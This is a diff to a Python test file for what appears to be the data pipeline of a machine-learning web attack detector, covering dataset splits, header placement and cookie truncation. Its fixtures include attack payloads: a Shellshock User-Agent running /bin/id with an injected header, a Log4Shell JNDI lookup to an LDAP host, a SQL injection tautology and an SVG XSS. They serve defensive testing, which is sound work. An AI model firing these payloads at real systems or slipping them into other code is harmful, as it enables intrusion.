@@ -372,7 +372,9 @@ def test_truncation_augment_is_label_independent_and_well_formed():
         if out.get("truncated"):
             hits += 1
             ck = next(v for k, v in out["http"]["headers"] if k == "Cookie")
-            assert ck == "; ".join(f"{k}={v}" for k, v in out["http"]["cookies"]) and len(out["http"]["cookies"][-1][1]) == 64
+            full = "; ".join(f"{k}={v}" for k, v in out["http"]["cookies"])
+            # contract 2 (prepare.SENSOR_CONTRACT): the rebuilt Cookie header is capped like any header
+            assert ck == full[:512] and any(len(v) == 64 for _, v in out["http"]["cookies"])
     assert 5 <= hits <= 40  # ~TRUNC_RATE of 500, decided by the record id only (never by the class)
 
 
@@ -406,3 +408,151 @@ def test_normalize_headers_keeps_payload_bearing_generic_headers():
     assert not any(k.lower().startswith("x-fixture") for k, _ in hs)
     plain = normalize_headers({"http": {"headers": [["User-Agent", "Mozilla/5.0 (X11; Linux x86_64)"]]}}, "k")
     assert "Mozilla/5.0 (X11; Linux x86_64)" not in [v for _, v in plain["http"]["headers"]]  # generic style replaced
+
+
+def _obs(rid, cls, src, grp, split, oid):
+    return {"id": rid, "metadata": {"threat_type": cls, "source": src, "provenance": "observed", "lineage_group": grp,
+                                    "split": split, "original_id": str(oid)}}
+
+
+def test_single_campaign_observed_class_trains_on_its_earlier_captures():
+    from data_pipeline.block_split import block_campaigns, observed_per_split
+    camp = "cic:172.16.0.1->192.168.10.50"  # one attacker host for every CIC-2017 attack class
+    recs = [_obs(f"ps{i}", "port_scan_recon", "cic17", camp, "val_select", 100 - i) for i in range(10)]
+    recs += [_obs(f"bf{i}", "credential_stuffing_bruteforce", "cic17", camp, "val_select", i) for i in range(5)]
+    recs += [_obs(f"b{i}", "benign_standard_traffic", "cic17", f"h{i}", "train", i) for i in range(15)]
+    recs += [_obs(f"sl{i}", "slowloris_slowhttp", "cic18", "c18", "train", i) for i in range(4)]  # already in train
+    recs += [_obs(f"u{i}", "slowloris_slowhttp", "cic17", camp + "u", "test_unseen", i) for i in range(4)]  # unseen source
+    moved = block_campaigns(recs)
+    assert set(moved) == {"cic17/port_scan_recon", "cic17/credential_stuffing_bruteforce"}
+    ps = sorted((r for r in recs if r["id"].startswith("ps")), key=lambda r: int(r["metadata"]["original_id"]))
+    assert [r["metadata"]["split"] for r in ps] == ["train"] * 8 + ["val_select"] * 2  # the latest 20% held out
+    assert ps[0]["metadata"]["lineage_group"].endswith("#port_scan_recon#early")
+    assert ps[-1]["metadata"]["lineage_group"].endswith("#port_scan_recon#late")
+    assert all(r["metadata"]["split"] == "test_unseen" for r in recs if r["id"].startswith("u"))
+    assert all(r["metadata"]["split"] == "train" for r in recs if r["id"].startswith("sl"))
+    assert observed_per_split(recs)["cic17"]["train"] == {"attack": 12, "benign": 15}
+    # every group in one split (the blocks are separate groups)
+    where = {}
+    for r in recs:
+        where.setdefault(r["metadata"]["lineage_group"], set()).add(r["metadata"]["split"])
+    assert all(len(v) == 1 for v in where.values())
+
+
+def test_unseen_source_leaves_train_with_its_benign_flows():
+    from data_pipeline.block_split import align_unseen_sources
+    recs = [_obs(f"a{i}", "slowloris_slowhttp", "cic18", "c18", "test_unseen", i) for i in range(3)]
+    recs += [_obs(f"b{i}", "benign_standard_traffic", "cic18", f"g{i % 2}", "train", i) for i in range(4)]
+    recs += [_obs(f"c{i}", "benign_standard_traffic", "cic17", f"k{i}", "train", i) for i in range(2)]
+    recs += [_obs("d0", "port_scan_recon", "cic17", "k9", "train", 0)]
+    assert align_unseen_sources(recs) == {"cic18": 4}
+    assert all(r["metadata"]["split"] == "test_unseen" for r in recs if r["id"].startswith("b"))
+    assert all(r["metadata"]["split"] == "train" for r in recs if r["id"][0] in "cd")
+
+
+def test_header_sink_places_raw_values_and_keeps_layers_visible():
+    import base64
+    from training.prepare import add_decoded_views
+    r = G.rng_for("hdr1")
+    tel = G.build_request(r, "header", "User-Agent", "() { :; }; /bin/id\r\nX: y", [["page", "2"]])
+    h = tel["http"]
+    uas = [v for k, v in h["headers"] if k.lower() == "user-agent"]
+    assert uas == ["() { :; }; /bin/id%0d%0aX: y"]  # replaces the client's UA; no raw line break inside a header
+    assert h["query"] == [["page", "2"]] and h["body"] is None and tel["decision_stage"] == "request_headers"
+    tel = G.build_request(G.rng_for("hdr2"), "header", "X-Api-Version", "${jndi:ldap://h/a}", [], layer="double_url")
+    assert ["X-Api-Version", "%24%7Bjndi%3Aldap%3A%2F%2Fh%2Fa%7D"] in tel["http"]["headers"]
+    assert {"field": "header.x-api-version", "decoder": "url", "depth": 1, "value": "${jndi:ldap://h/a}"} in tel["http"]["decoded_views"]
+    tel = add_decoded_views(G.build_request(G.rng_for("hdr3"), "header", "X-Client-Ref", "1' OR '1'='1", [], layer="base64"))
+    assert ["X-Client-Ref", base64.b64encode(b"1' OR '1'='1").decode()] in tel["http"]["headers"]
+    assert any(v["field"] == "header.x-client-ref" and v["decoder"] == "base64" and v["value"] == "1' OR '1'='1"
+               for v in tel["http"]["decoded_views"])  # the sensor view reads header values too
+
+
+def test_header_sink_twins_and_benign_share_the_header_names():
+    from data_pipeline.mechanisms import tags
+    seen_attack, seen_benign = set(), set()
+    for i in range(400):
+        seed = {"id": f"hs{i}", "class": "xss_reflected_stored", "payload": "<svg onload=alert(1)>"}
+        info = {}
+        a, _ = G.wrap_http(seed, info=info)
+        if info["sink"] != "header":
+            continue
+        b, _ = G.wrap_http(seed, twin=True)
+        names_a = [k for k, _ in a["http"]["headers"]]
+        assert names_a == [k for k, _ in b["http"]["headers"]]  # minimal pair: same header layout
+        from training.prepare import add_decoded_views
+        a, b = add_decoded_views(a), add_decoded_views(b)  # a URL / Base64 layer is read through the sensor view
+        assert "<svg" in json.dumps(a) and "<svg" not in json.dumps(b)
+        extra = [k for k in names_a if k not in ("Host",)]
+        seen_attack |= {k for k in extra if k in G.HEADER_SINKS or k.startswith("X-")}
+        assert "loc:header" in tags(a, {"sink": "header"}, {})
+    for i in range(600):
+        tel, sc = G.synth_benign_http("benign_standard_traffic", i)
+        if sc["sink"] == "header":
+            seen_benign |= {k for k, _ in tel["http"]["headers"] if k in G.HEADER_SINKS or k.startswith("X-")}
+            assert "loc:header" in tags(tel, {"scenario": sc}, {})
+    assert seen_attack and seen_benign
+    named = {"User-Agent", "X-Forwarded-For", "X-Api-Version", "X-Client-Ref", "X-Device-Id"}
+    assert named & seen_attack == named & seen_benign  # no header name that only attacks use
+
+
+def _many_cookies(n):
+    cookies = [[f"analytics_cookie_{i:02d}", "v" * 40] for i in range(n)]
+    return {"schema_version": 1, "mode": "L7_HTTP", "http": {
+        "method": "GET", "target": "/home", "headers": [["Host", "a.example"], ["Cookie", "; ".join(f"{k}={v}" for k, v in cookies)]],
+        "query": None, "cookies": cookies, "body": None}}
+
+
+def test_contract_2_caps_the_cookie_header_and_drops_cookies_beyond_48():
+    from training.prepare import MAX_COOKIES, fit_budget
+    count = lambda t: len(json.dumps(t)) // 4  # noqa: E731
+    tel = _many_cookies(89)  # open-appsec browsing: ~72 cookies per request, max 89
+    one = fit_budget(tel, count, 10**6, contract=1)
+    cookie1 = next(v for k, v in one["http"]["headers"] if k == "Cookie")
+    assert cookie1.count("analytics_cookie_") == 89 and "cookies_truncated" not in one["http"]  # contract 1: full header
+    two = fit_budget(tel, count, 10**6, contract=2)
+    assert len(next(v for k, v in two["http"]["headers"] if k == "Cookie")) <= 512 and len(two["http"]["cookies"]) == 89
+    # a budget only the cookie-dropping level meets: unfittable under contract 1
+    tight = count(fit_budget(tel, count, 10**6, contract=2) | {}) - 1
+    while fit_budget(tel, count, tight, contract=2) and fit_budget(tel, count, tight, contract=2)["http"].get("cookies_truncated") is None:
+        tight -= 20
+    last = fit_budget(tel, count, tight, contract=2)
+    assert last is not None and fit_budget(tel, count, tight, contract=1) is None
+    assert len(last["http"]["cookies"]) == MAX_COOKIES and last["http"]["cookies_truncated"] == 89 - MAX_COOKIES
+    assert last["truncated"] is True and count(last) <= tight
+
+
+def test_contract_2_truncation_records_carry_the_new_key_in_every_class():
+    from training.prepare import MAX_COOKIES
+    hits = {"attack": 0, "benign": 0}
+    for i in range(4000):
+        for kind, cls in (("attack", "sqli_classic"), ("benign", "benign_standard_traffic")):
+            tel = G.truncation_augment(G.build_request(G.rng_for(f"tr{i}"), "query", "q", "x", []), f"{cls}:{i}")
+            h = tel["http"]
+            if "cookies_truncated" in h:
+                hits[kind] += 1
+                assert len(h["cookies"]) <= MAX_COOKIES and tel["truncated"]
+                assert len(next(v for k, v in h["headers"] if k == "Cookie")) <= 512
+    assert hits["attack"] > 10 and hits["benign"] > 10  # ~4% x 30% of HTTP records, on both sides
+
+
+def test_fragment_probes_stay_out_of_training_and_leave_half_the_pool(monkeypatch):
+    pool = [{"payload": f"frag{i}", "reason": "too_short_ambiguous", "source": "seclists", "class": "sqli_classic"}
+            for i in range(150)]
+    monkeypatch.setattr(G, "rejected_fragments", lambda: pool)
+    probes = G.fragment_probes(pool)
+    assert len(probes) == min(G.REJECTED_PROBES, 75)  # never more than half the pool
+    train = G.gen_fragments(200)
+    used = {json.loads(r["messages"][1]["content"].split("] ", 1)[1])["http"]["query"][-1][1] for r in train}
+    assert len(train) == 150 - len(probes) and not used & {x["payload"] for x in probes}
+
+
+def test_robustness_exclusion_keeps_a_blocked_campaign_host_used(tmp_path, monkeypatch):
+    from data_pipeline import robustness as RB
+    (tmp_path / "datasets_ready").mkdir()
+    rows = [{"metadata": {"lineage_group": "cic:172.16.0.1->192.168.10.50#port_scan_recon#early"}},
+            {"metadata": {"lineage_group": "seed:abc"}}]
+    (tmp_path / "datasets_ready/fast_train.jsonl").write_text("".join(json.dumps(r) + "\n" for r in rows))
+    monkeypatch.setattr(RB, "ROOT", tmp_path)
+    used = RB.core_groups()
+    assert "cic:172.16.0.1->192.168.10.50" in used and "seed:abc" in used  # OOT flows of that host stay excluded
